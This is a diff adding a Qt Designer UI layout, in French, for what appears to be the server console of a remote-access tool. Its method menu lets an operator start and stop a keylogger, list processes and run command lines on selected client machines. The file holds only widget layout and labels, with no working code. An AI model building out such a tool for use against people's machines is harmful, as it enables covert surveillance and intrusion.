@@ -1,0 +1,234 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<ui version="4.0">
+ <class>MainWindow</class>
+ <widget class="QMainWindow" name="MainWindow">
+  <property name="geometry">
+   <rect>
+    <x>0</x>
+    <y>0</y>
+    <width>960</width>
+    <height>540</height>
+   </rect>
+  </property>
+  <property name="windowTitle">
+   <string>MainWindow</string>
+  </property>
+  <property name="autoFillBackground">
+   <bool>false</bool>
+  </property>
+  <widget class="QWidget" name="centralwidget">
+   <widget class="QFrame" name="frame_2">
+    <property name="geometry">
+     <rect>
+      <x>688</x>
+      <y>90</y>
+      <width>250</width>
+      <height>430</height>
+     </rect>
+    </property>
+    <property name="frameShape">
+     <enum>QFrame::Shape::StyledPanel</enum>
+    </property>
+    <property name="frameShadow">
+     <enum>QFrame::Shadow::Raised</enum>
+    </property>
+    <widget class="QListWidget" name="clientListWidget">
+     <property name="enabled">
+      <bool>true</bool>
+     </property>
+     <property name="geometry">
+      <rect>
+       <x>10</x>
+       <y>50</y>
+       <width>230</width>
+       <height>330</height>
+      </rect>
+     </property>
+     <property name="layoutDirection">
+      <enum>Qt::LayoutDirection::LeftToRight</enum>
+     </property>
+    </widget>
+    <widget class="QPushButton" name="selectionButton">
+     <property name="geometry">
+      <rect>
+       <x>8</x>
+       <y>390</y>
+       <width>230</width>
+       <height>30</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>Sélection</string>
+     </property>
+    </widget>
+    <widget class="QComboBox" name="comboBox">
+     <property name="geometry">
+      <rect>
+       <x>10</x>
+       <y>10</y>
+       <width>231</width>
+       <height>28</height>
+      </rect>
+     </property>
+     <item>
+      <property name="text">
+       <string>Afficher les informations du client</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Démarrer le keylogger</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Eteindre le keylogger</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Afficher la liste complète des processus</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Afficher la liste des processus (noms)</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Ecrire une ligne de commande</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Déconnecter le client sélectionné (Prévision)</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Analyse de données du client sélectionné (Prévision)</string>
+      </property>
+     </item>
+    </widget>
+   </widget>
+   <widget class="QFrame" name="frame">
+    <property name="geometry">
+     <rect>
+      <x>18</x>
+      <y>90</y>
+      <width>660</width>
+      <height>430</height>
+     </rect>
+    </property>
+    <property name="frameShape">
+     <enum>QFrame::Shape::StyledPanel</enum>
+    </property>
+    <property name="frameShadow">
+     <enum>QFrame::Shadow::Raised</enum>
+    </property>
+    <widget class="QTabWidget" name="tabWidget">
+     <property name="geometry">
+      <rect>
+       <x>24</x>
+       <y>39</y>
+       <width>610</width>
+       <height>370</height>
+      </rect>
+     </property>
+     <property name="currentIndex">
+      <number>0</number>
+     </property>
+     <widget class="QWidget" name="clientTab">
+      <attribute name="title">
+       <string>Info</string>
+      </attribute>
+      <widget class="QListWidget" name="listWidget">
+       <property name="geometry">
+        <rect>
+         <x>11</x>
+         <y>20</y>
+         <width>587</width>
+         <height>301</height>
+        </rect>
+       </property>
+       <item>
+        <property name="text">
+         <string>Informations sur l'utilisation de l'interface serveur :</string>
+        </property>
+       </item>
+       <item>
+        <property name="text">
+         <string/>
+        </property>
+       </item>
+       <item>
+        <property name="text">
+         <string>1- Choisir quelle méthode utiliser dans le menu déroulant</string>
+        </property>
+       </item>
+       <item>
+        <property name="text">
+         <string/>
+        </property>
+       </item>
+       <item>
+        <property name="text">
+         <string>2- Sélectionner le client sur lequel utiliser la méthode</string>
+        </property>
+       </item>
+       <item>
+        <property name="text">
+         <string/>
+        </property>
+       </item>
+       <item>
+        <property name="text">
+         <string>3- Cliquer sur le bouton &quot;Sélectionner&quot;</string>
+        </property>
+       </item>
+       <item>
+        <property name="text">
+         <string/>
+        </property>
+       </item>
+       <item>
+        <property name="text">
+         <string>4- Regarder le résultat dans la sortie de l'onglet correspondant au client choisi pour la méthode</string>
+        </property>
+       </item>
+      </widget>
+     </widget>
+    </widget>
+   </widget>
+   <widget class="QLabel" name="label_2">
+    <property name="geometry">
+     <rect>
+      <x>20</x>
+      <y>70</y>
+      <width>81</width>
+      <height>21</height>
+     </rect>
+    </property>
+    <property name="text">
+     <string>Sortie</string>
+    </property>
+   </widget>
+   <widget class="QLabel" name="labelRight">
+    <property name="geometry">
+     <rect>
+      <x>690</x>
+      <y>70</y>
+      <width>71</width>
+      <height>21</height>
+     </rect>
+    </property>
+    <property name="text">
+     <string>Méthodes</string>
+    </property>
+   </widget>
+  </widget>
+ </widget>
+ <resources/>
+ <connections/>
+</ui>
